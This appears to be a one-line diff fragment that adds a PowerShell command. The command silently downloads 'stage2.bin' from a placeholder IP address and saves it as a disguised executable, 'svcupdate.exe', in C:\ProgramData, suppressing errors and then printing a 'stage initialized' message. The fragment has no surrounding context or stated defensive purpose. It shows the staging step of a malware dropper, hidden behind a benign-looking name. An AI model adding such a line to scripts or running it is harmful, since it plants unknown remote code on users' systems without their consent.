@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage1Url = 'http://192.0.2.148/stage2.bin'; $DropPath = 'C:\ProgramData\svcupdate.exe'; Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Write-Output "stage 27 initialized"
